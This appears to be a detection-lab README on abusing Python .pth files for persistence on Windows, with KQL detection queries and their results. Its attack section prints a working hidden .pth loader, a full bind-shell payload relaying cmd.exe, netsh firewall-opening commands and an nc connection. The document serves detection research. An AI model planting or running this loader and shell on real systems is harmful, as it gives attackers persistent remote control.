# How do I use this?
Go to https://dataexplorer.azure.com, then create a free ADX cluster account and a new database. Copy the [init.kql](https://github.com/ksyeung/DetLabs/blob/main/python_pth_persistence/init.kql) data in this folder and paste it into the ADX web UI query window. This will create the required tables, ASIM parsers, helper functions, and start ingestion of the telemetry (WindowsEvent[...].parquet, etc).

# Abusing Python .pth files for persistence on Windows
This work is based on Stephan Berger's work [Analysis of Python's .pth files as a persistence mechanism](https://dfir.ch/posts/publish_python_pth_extension), and Volexity Threat Research's post [Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)](https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400).

---

Pre-requisites:
1. Python version 3.5+
2. `setuptools` installed by pip

### The attack

1. Appended code to `C:\Users\domainuser\AppData\Local\Programs\Python\Python313\Lib\site-packages\distutils-precedence.pth`:
```python
__import__('subprocess').Popen(['pythonw','-c','exec(__import__("base64").b64decode("...").decode())'],creationflags=0x08000000)
```

Where the base64-encoded data is:
```python
import socket,subprocess,threading,os
s=socket.socket()
s.bind(('0.0.0.0',45565))
s.listen(1)
c,a=s.accept()
s.close()
p=subprocess.Popen('cmd.exe',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,creationflags=0x08000000)
def relay():
 while True:
  try:
   data=os.read(p.stdout.fileno(),4096)
   if not data:break
   c.sendall(data)
  except:break
threading.Thread(target=relay,daemon=True).start()
while True:
 try:
  data=c.recv(4096)
  if not data:break
  p.stdin.write(data)
  p.stdin.flush()
 except:break
```
2. `python` executed in `cmd.exe` (anything involving Python will do: launching IDLE, opening a Jupyter notebook, ...)
2. First execution resulted in a Windows Firewall prompt about something getting blocked. Only a Cancel button is available
3. Launched a cmd.exe with admin privs, then executed:
```
netsh advfirewall firewall delete rule name="pythonw.exe" dir=in
netsh advfirewall firewall add rule name="Test Lab" dir=in action=allow protocol=tcp localport=45555-45565 profile=any
```
4. Executed `python` again in `cmd.exe`
5. Another machine on the LAN connected to the victim: `nc 10.2.10.21 45565`
6. The attacker executed `whoami`, `hostname`, `cd Documents`, `dir`, `cd ../Downloads`, `dir`

### The detection
I began with this: 
```
DeviceFileEvents
| where ActionType == "FileModified" and FileName endswith ".pth"
```
Unfortunately, DeviceFileEvents doesn't have any results. MDE applies sampling/filtering, and may not log some FileModified events.

Sysmon Event ID 11: FileCreate caught it, however.

```
_ASim_FileEvent
| where TargetFileName endswith ".pth"
| where TargetFileName !startswith "http"
| where EventType in ("FileCreated", "FileModified", "FileRenamed")
| where TargetFilePath has_any ("site-packages", "dist-packages")
| project
    TimeGenerated, DvcHostname, EventType, TargetFileName, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
```

Note that `| where TargetFileName !beginswith "http"` is intended to filter SharePoint sync events.

Query output:
| TimeGenerated | DvcHostname | EventType | TargetFileName | TargetFilePath | ActingProcessName | ActorUsername |
|---|---|---|---|---|---|---|
| 2/10/2026, 4:36:31.178 AM | JD-WIN11-22H2-1.ludus.domain | FileCreated | distutils-precedence.pth | C:\Users\domainuser\AppData\Local\Programs\Python\Python313\Lib\site-packages\distutils-precedence.pth | C:\Users\domainuser\AppData\Local\Programs\Python\Python313\python.exe | ludus\domainuser |
| 2/10/2026, 4:37:00.968 AM | JD-WIN11-22H2-1.ludus.domain | FileCreated | distutils-precedence.pth | C:\Users\domainuser\AppData\Local\Programs\Python\Python313\Lib\site-packages\distutils-precedence.pth | C:\Users\domainuser\AppData\Local\Programs\Python\Python313\pythonw.exe | ludus\domainuser |

I adapted this [Linux rule](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-12-python-path-file-pth-creation.html) from Elastic. I omitted the process exec exclusion expression from the Elastic query because it may be possible to evade. Feel free to submit a PR: I suspect this detection is prone to false positives.

---

Other research regarding malicious `.pth` files: Rapid7 on [From .pth to p0wned: Abuse of Pickle Files in AI Model Supply Chains](https://www.rapid7.com/blog/post/from-pth-to-p0wned-abuse-of-pickle-files-in-ai-model-supply-chains)
